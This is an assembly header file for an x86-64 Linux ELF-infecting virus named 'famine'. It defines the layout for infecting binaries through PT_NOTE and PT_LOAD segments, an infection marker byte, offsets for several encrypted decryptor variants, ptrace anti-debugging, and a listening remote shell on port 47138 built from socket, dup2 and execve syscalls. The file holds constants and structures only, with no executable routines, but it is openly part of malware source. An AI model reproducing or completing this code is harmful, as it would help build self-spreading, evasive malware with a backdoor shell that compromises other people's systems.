%define PROG_SIZE                _end - main
%define JMP_OFFSET               jump - main
%define SIGNATURE_SIZE           signature_end - signature
%define KEY_SIZE                 signature - key
%define KEY_OFFSET               key - main
%define SIGNATURE_KEY_OFFSET     signature_key - main
%define ENCRYPT_SIZE             key - encrypted_start
%define ENCRYPT_OFFSET           encrypted_start - main
%define DECRYPT_KEY_OFFSET       key - decrypte
%define DECRYPT_FUNC_SIZE        encrypted_start - decrypte
%define DECRYPT_OFFSET           decrypte - main
%define DECRYPT_V1_SIZE          decrypt_v1_end - decrypt_v1
%define DECRYPT_V2_SIZE          decrypt_v2_end - decrypt_v2
%define DECRYPT_V3_SIZE          decrypt_v3_end - decrypt_v3
%define READ_DIR_BUFF_SIZE       256
%define PATH_BUFF_SIZE           1024
%define PROCESS_PATH_LEN         100
%define PROCESS_STATUS_READ_SIZE 20
%define WAIT_FORK_OPTION         14


%define O_RDONLY	0
%define O_WRONLY	1
%define O_RDWR      2
%define O_APPEND	    1024
%define SEEK_END        2
%define PROT_READ       1
%define PROT_WRITE      2
%define MAP_SHARED      1
%define PT_LOAD	        1
%define PT_NOTE         4
%define PF_X            1
%define PF_W            2
%define PF_R            4
%define DT_DIR          4
%define DT_REG          8
%define GRND_RANDOM     2
%define PTRACE_TRACEME  0
%define CLOCK_REALTIME	0

%define SOL_SOCKET      1
%define SO_REUSEADDR    2
%define AF_INET         2
%define SOCK_STREAM     1
%define PORT            47138 ; 8888
%define INADDR_ANY      0
%define REMOTE_SHELL_STACK_SIZE sockaddr_in_size + 32


%define SYS_READ        0
%define SYS_WRITE       1
%define SYS_OPEN        2
%define SYS_CLOSE       3
%define SYS_LSEEK       8
%define SYS_MMAP        9
%define SYS_MUNMAP      11
%define SYS_DUP2        33
%define SYS_GETPID      39
%define SYS_SOCKET      41
%define SYS_ACCEPT      43
%define SYS_BIND        49
%define SYS_LISTEN      50
%define SYS_SETSOCKOPT  54
%define SYS_FORK        57
%define SYS_EXECVE      59
%define SYS_EXIT        60
%define SYS_WAIT4       61
%define SYS_FTRUNCATE   77
%define SYS_GETDENTS    78
%define SYS_PTRACE      101
%define SYS_SETSID      112
%define SYS_TIME        201
%define SYS_GETTIME     228
%define SYS_GETRANDOM   318

struc   Elf64_Ehdr
    e_ident:     resb 15   ;       /* Magic number and other info */
    e_infected:  resb 1
    e_type:      resw 1    ;		/* Object file type */
    e_machine:   resw 1    ;		/* Architecture */
    e_version:   resd 1    ;		/* Object file version */
    e_entry:     resq 1    ;		/* Entry point virtual address */
    e_phoff:     resq 1    ;		/* Program header table file offset */
    e_shoff:     resq 1    ;		/* Section header table file offset */
    e_flags:     resd 1    ;		/* Processor-specific flags */
    e_ehsize:    resw 1    ;		/* ELF header size in bytes */
    e_phentsize: resw 1    ;		/* Program header table entry size */
    e_phnum:     resw 1    ;		/* Program header table entry count */
    e_shentsize: resw 1    ;		/* Section header table entry size */
    e_shnum:     resw 1    ;		/* Section header table entry count */
    e_shstrndx:  resw 1    ;		/* Section header string table index */
endstruc

struc Elf64_Phdr
    p_type:   resd 1 ;	    /* Segment type */
    p_flags:  resd 1 ;		/* Segment flags */
    p_offset: resq 1 ;		/* Segment file offset */
    p_vaddr:  resq 1 ;	    /* Segment virtual address */
    p_paddr:  resq 1 ;	    /* Segment physical address */
    p_filesz: resq 1 ;		/* Segment size in file */
    p_memsz:  resq 1 ;		/* Segment size in memory */
    p_align:  resq 1 ;		/* Segment alignment */
endstruc

struc magic_num
    s_magic_number:	resd 1;
	s_support:	 	resb 1;
	s_endian:		resb 1;
	s_version:		resb 1;	
	s_abi:			resb 1;	
endstruc

struc linux_dirent
	d_ino: resq  1;		/* Numero d'inode */
	d_off: resq  1;		/* offset		  */
	d_reclen: resw 1;	/* taille prise par le fichier au sein du dossier */
	d_name:	 resb 1;	/* nom du fichier visé */
endstruc

struc process_finder
	process_dir_buffer: resb READ_DIR_BUFF_SIZE
	process_path:		resb PROCESS_PATH_LEN
	process_status:		resb PROCESS_STATUS_READ_SIZE
endstruc

struc sockaddr_in
	.family:	resw 1
    .port:      resw 1
    .inaddr:    resd 1
    .zero:    	resq 1
endstruc

struc famine
    fd:         resq 1
    fileSize:   resq 1
    fileData:   resq 1
    segv_mode:  resq 1
    pload:      resq 1
    ptnote:     resq 1
    lastPload:  resq 1
    entry:      resq 1
    oldEntry:   resq 1
    ppid:       resq 1
    programStart: resq 1
    virusId:    resq 3

    fileName: resb PATH_BUFF_SIZE
endstruc
